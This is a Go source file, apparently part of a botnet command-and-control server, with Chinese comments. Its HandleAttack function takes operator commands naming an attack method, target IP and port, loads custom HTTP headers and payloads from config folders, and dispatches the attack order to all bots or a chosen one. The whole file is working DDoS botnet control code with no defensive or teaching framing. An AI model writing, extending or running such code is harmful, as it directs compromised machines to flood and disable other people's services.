package attack

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"strconv"
	
	"c2/bot"
	"c2/config"
)

// LoadHeadersAndPayload 从指定文件夹读取header.txt和payload.txt
func LoadHeadersAndPayload(folderPath string) (string, string, error) {
	// 将路径统一定位到config目录下
	folderPath = filepath.Join(config.ConfigDir, folderPath)
	header := "" 
	payload := ""
	
	// 从header.txt加载头部（如果存在）
	headerPath := filepath.Join(folderPath, "header.txt")
	if _, err := os.Stat(headerPath); err == nil {
		headerData, err := ioutil.ReadFile(headerPath)
		if err != nil {
			return "", "", fmt.Errorf("failed to read header file: %v", err)
		}
		header = string(headerData)
	}
	
	// 从payload.txt加载负载数据（如果存在）
	payloadPath := filepath.Join(folderPath, "payload.txt")
	if _, err := os.Stat(payloadPath); err == nil {
		payloadData, err := ioutil.ReadFile(payloadPath)
		if err != nil {
			return "", "", fmt.Errorf("failed to read payload file: %v", err)
		}
		payload = string(payloadData)
	}
	
	return header, payload, nil
}

// HandleAttack 处理攻击命令
func HandleAttack(args []string) {

	// 检查最小所需参数（方法、目标、端口）
	if len(args) < 3 {
		fmt.Println("[!] Usage: attack <method> <target IP> <port> [path] [dataFolder/botIP]")
		fmt.Printf("Available methods: %v\n", config.GetAllMethods())
		return
	}

	method := strings.ToUpper(args[0])
	target := args[1]
	port,err := strconv.Atoi(args[2])
	if err != nil {
		fmt.Println("[!] Invalid port number")
		return
	}
	
	// 初始化基本参数
	path := ""       // 第4个参数: URL路径或botIP
	botIP := ""      // 特定机器人IP（可选）
	
	// 默认空头部和负载
	header := ""   // 空JSON对象字符串
	payload := ""

	// 验证攻击方法
	if !config.IsValidMethod(method) {
		fmt.Println("[!] Invalid attack method")
		return
	}

	// 根据攻击方法类型处理参数
	if config.IsHTTPMethod(method) {
		// HTTP方法，需要path和可能的配置名称
		if len(args) > 3 {
			path = args[3] // URL路径
		}
		
		if len(args) > 4 {
			configNameOrIP := args[4]
			
			// 检查配置目录是否存在
			configPath := filepath.Join(config.ConfigDir, configNameOrIP)
			if fi, err := os.Stat(configPath); err == nil && fi.IsDir() {
				// 从配置目录加载头部和负载
				var err error
				header, payload, err = LoadHeadersAndPayload(configNameOrIP)
				if err != nil {
					fmt.Printf("[!] Error loading headers and payload: %v\n", err)
					return
				}
				fmt.Printf("[+] Loaded headers and payload from config/%s/\n", configNameOrIP)
			} else {
				// 不是配置名称，当作机器人IP
				botIP = configNameOrIP
			}
		}
		
		// 如果有第6个参数，它必须是机器人IP
		if len(args) > 5 {
			botIP = args[5]
		}
	} else if config.IsLayer4Method(method) {
		// Layer4攻击，path/header/payload保持为空，任何第4个参数都视为机器人IP
		if len(args) > 3 {
			botIP = args[3]
		}
	}

	// 构建发送给bot的命令（总是6个参数）
	command := config.BotCommand{
		Method:  method,
		IP:      target,
		Port:    port,
		Path:    path,
		Header:  header, 
		Payload: payload,  
	}
	
	// 发送命令给机器人
	bot.SendBotCommand(command, botIP)
}